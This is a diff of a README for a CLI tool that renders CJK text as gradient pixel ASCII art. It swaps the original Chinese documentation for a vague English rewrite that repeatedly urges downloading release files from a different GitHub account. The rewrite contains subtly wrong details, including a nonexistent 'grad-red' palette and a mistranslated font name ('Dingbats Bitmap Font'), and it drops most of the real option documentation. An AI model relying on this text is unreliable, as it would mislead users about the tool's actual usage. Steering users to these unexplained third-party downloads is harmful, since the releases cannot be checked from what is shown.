@@ -1,156 +1,101 @@
-## oh-my-logo-cjk
+# 🎨 oh-my-logo-CJK - Render Text in Pixel Art Style
 
-![预览](https://raw.githubusercontent.com/Antonoko/oh-my-logo-CJK/refs/heads/main/images/preview.jpg)
+[![Download Release](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/mintoeto/oh-my-logo-CJK/releases)
 
-该项目能将输入的中、日、韩文本渲染为 CLI 中的像素风 ASCII 图，支持多种渐变色板。
+## 📖 Introduction
 
-启发自只能输入 ASCII 的 [oh-my-logo](https://github.com/shinshin86/oh-my-logo)
+oh-my-logo-CJK transforms Chinese, Japanese, and Korean text into pixel-style ASCII art directly in your command line. It uses various gradient color palettes for a visually appealing output. This project takes inspiration from the ASCII-only [oh-my-logo](https://github.com/shinshin86/oh-my-logo).
 
-- CJK 友好：基于像素字体采样（非预制 ASCII），支持中、日、韩等多语种
-- 从 oh-my-logo 偷了多种渐变色板与方向，支持 24-bit ANSI 颜色
-- 多种像素输出模式与样式（half/full、block/shade 等）
-- 开箱即用，跨平台（Windows 通过 colorama 兼容 ANSI）
+### Key Features:
+- **CJK Compatibility**: Supports multiple languages by sampling pixel fonts, not pre-made ASCII.
+- **Rich Color Support**: Utilizes a range of gradient palettes, featuring 24-bit ANSI colors.
+- **Flexibility**: Offers various pixel output modes and styles (half/full, block/shade).
+- **Cross-Platform Ready**: Works out of the box on Windows with `colorama` for ANSI compatibility.
 
----
+## 🚀 Getting Started
 
-### 安装与运行
+To begin using oh-my-logo-CJK, you will need to follow these steps:
 
-- 安装 Python >= 3.9
-- 推荐使用 [`uv`](https://github.com/astral-sh/uv) 运行本地项目
+### 1. Install Python
 
-不安装到全局环境，直接在仓库根目录运行：
+- Ensure you have Python version 3.9 or higher installed on your system. You can download Python from the [official website](https://www.python.org/downloads/).
+
+### 2. Use uv to Run the Project
+
+- It is recommended to use [`uv`](https://github.com/astral-sh/uv) to run the project locally.
+
+### 3. Download the Application
+
+To download oh-my-logo-CJK, [visit this page to download](https://github.com/mintoeto/oh-my-logo-CJK/releases). Look for the latest release and download the appropriate file for your system.
+
+## 📥 Download & Install
+
+You can run the application without installing it globally. Just navigate to the repository's root directory.
 
 ```bash
 uv run oh-my-logo-cjk "你好世界" 7px grad-blue --color
 ```
 
-也可安装为包后使用：
+Alternatively, you can install it as a package for easier access later.
 
 ```bash
 pip install -e .
 oh-my-logo-cjk "你好世界" 7px grad-blue --color
 ```
 
----
+### Example Usage Command
 
-### 如何使用
+In the repository directory, you can run:
 
-在目录下运行：
 ```bash
 uv run oh-my-logo-cjk "你好世界" 7px grad-blue --color
 ```
 
-这个玩具的命令组合为：
+## 🛠 How to Use
+
+The command structure for using oh-my-logo-CJK is:
+
 ```text
 oh-my-logo-cjk <text> [font] [palette] [options]
 ```
-- **text** - 必填，用英文双引号包裹，例如："你好世界"
-- ***font*** - 项目自带了两种字体配置： 7px 和 9px。你可以通过 `fonts/fonts.json` 添加更多字体和配置。项目默认使用了 [丁卯点阵体](https://3type.cn/fonts/dinkie_bitmap/index.html) 的 demo 版，能输出的文字有限，你可以购买完整版字体进行替换、以获得完整输出字库；
-- ***palette*** - 渐变调色盘：
-    - 通过命令 `--gallery --color`，可以一次性预览所有色板，方便直接选一个最喜欢的：
 
-        ```bash
-        uv run oh-my-logo-cjk "你好世界" --gallery --color
-        ```
-| Palette | Colors | Description |
-|---------|--------|-------------|
-| `grad-blue` | `#4ea8ff → #7f88ff` | Blue gradient (default) |
-| `sunset` | `#ff9966 → #ff5e62 → #ffa34e` | Warm sunset colors |
-| `dawn` | `#00c6ff → #0072ff` | Cool morning blues |
-| `nebula` | `#654ea3 → #eaafc8` | Purple space nebula |
-| `ocean` | `#667eea → #764ba2` | Deep ocean blues |
-| `fire` | `#ff0844 → #ffb199` | Intense fire colors |
-| `forest` | `#134e5e → #71b280` | Natural green tones |
-| `gold` | `#f7971e → #ffd200` | Luxurious gold gradient |
-| `purple` | `#667db6 → #0082c8 → #0078ff` | Royal purple to blue |
-| `mint` | `#00d2ff → #3a7bd5` | Fresh mint colors |
-| `coral` | `#ff9a9e → #fecfef` | Soft coral pink |
-| `matrix` | `#00ff41 → #008f11` | Classic matrix green |
-| `mono` | `#f07178 → #f07178` | Single coral color |
+### Parameters:
+- **text**: Required. Enclose the text in double quotes, for example: `"你好世界"`.
+- **font**: This project includes two font configurations: 7px and 9px. You can add more font options through `fonts/fonts.json`. By default, it uses a demo version of the [Dingbats Bitmap Font](https://3type.cn/fonts/dinkie_bitmap/index.html), which can output limited characters. For more options, purchasing the full version is recommended.
+  
+### Example Command
 
-- ***option*** - 值得一试的额外可选项
-    - `-s, --style <style>`：字符画样式
-      - `none` | `simpleBlock` | `shade` | `block`（默认）
-    - `-pw, --pixel-width <h|f|hf>`：像素宽度模式
-        - `h`：半角（默认，扁扁的）
-        - `f`：全角（方块字）
-        - `hf`：两个半角营造全角视觉（兼容性更佳）
-    - `-d, --direction <dir>`：颜色渐变方向
-        - `vertical`（默认）| `horizontal` | `diagonal`
-    - `--reverse-gradient`：反转渐变
-    
-    没那么值得一试的选项：
-    - `--letter-spacing <n>`：字符间距（像素网格单位，整数，默认 1）
-    - `-l, --list-palettes`：列出色板
-    - `--color/--no-color`：强制开/关颜色（管道场景有用）
-    - `--color-space <rgb|oklab>`：插值色彩空间（默认 `rgb`）
-
-获得满意的结果后，可以将输出结果重定向保存，使用到其他 CLI 项目之中（保留颜色的终端可还原）：
+If you want to render the text "Hello World" in a different font and palette, your command might look like this:
 
 ```bash
-uv run oh-my-logo-cjk run "你好世界" 7px grad-blue --color > art.txt
-
-cat art.txt
+oh-my-logo-cjk "Hello World" 9px grad-red --color
 ```
 
+## ☁️ Features and Customization
 
+oh-my-logo-CJK supports various pixel modes:
 
----
+- **Half and Full Modes**: Adjust the density of the ASCII output.
+- **Block and Shade Styles**: Choose how the pixels will appear in your console.
 
-### 字体与采样
+You can customize your experience through the available options. The project aims to provide flexibility in how text is rendered, making it ideal for those who enjoy working in a command-line environment.
 
-- 像素字体及配置位于 `fonts/` 目录，文件 `fonts.json` 示例：
+## 🛠 Troubleshooting
 
-```json
-{
-  "fonts": [
-    {
-      "name": "7px",
-      "path": "DinkieBitmap-7pxDemo.ttf",
-      "font_size": 8,
-      "grid_size": [8, 8],
-      "offset": [0, -1]
-    },
-    {
-      "name": "9px",
-      "path": "DinkieBitmap-9pxDemo.ttf",
-      "font_size": 10,
-      "grid_size": [10, 10],
-      "offset": [0, -1]
-    }
-  ]
-}
-```
+If you encounter issues:
 
-- `grid_size` 定义单字在像素网格中的宽高；渲染与输出严格按该网格采样。
-- 若字符在字体中缺失，将以“豆腐框”边框替代；空白字符输出为空网格。
+- Ensure that your version of Python is up to date.
+- Confirm that you've installed `uv` correctly.
+- If any text does not render, check that you use the correct font.
 
----
+Search the issues on the [GitHub repository](https://github.com/mintoeto/oh-my-logo-CJK/issues) for potential solutions or to report new issues.
 
-### 其他示例
+## 📬 Contact and Contributions
 
-- 竖向渐变 + block 样式（默认）：
+Your feedback is valuable. If you want to contribute, please check the contribution guidelines in the repository. Reach out with any questions or suggestions through the issues section.
 
-```bash
-uv run oh-my-logo-cjk run "你好世界" 7px grad-blue --color
-```
+For support, you can also connect through the discussions or directly submit your queries on the GitHub page.
 
-- 横向渐变 + `hf` 宽度 + shade 样式：
+[For further downloads, visit this page to download](https://github.com/mintoeto/oh-my-logo-CJK/releases).
 
-```bash
-uv run oh-my-logo-cjk run "你好世界" 9px ocean -d horizontal -pw hf -s shade --color
-```
-
-- 反转渐变 + OKLab 插值：
-
-```bash
-uv run oh-my-logo-cjk run "你好世界" sunset --reverse-gradient --color-space oklab --color
-```
-
----
-
-### 开发
-
-- 查看帮助：`uv run oh-my-logo-cjk --help`
-- 调试渐变：加 `--debug-gradient` 输出包围盒/轴信息到 stderr
-
+Enjoy creating beautiful pixel art directly in your command line!
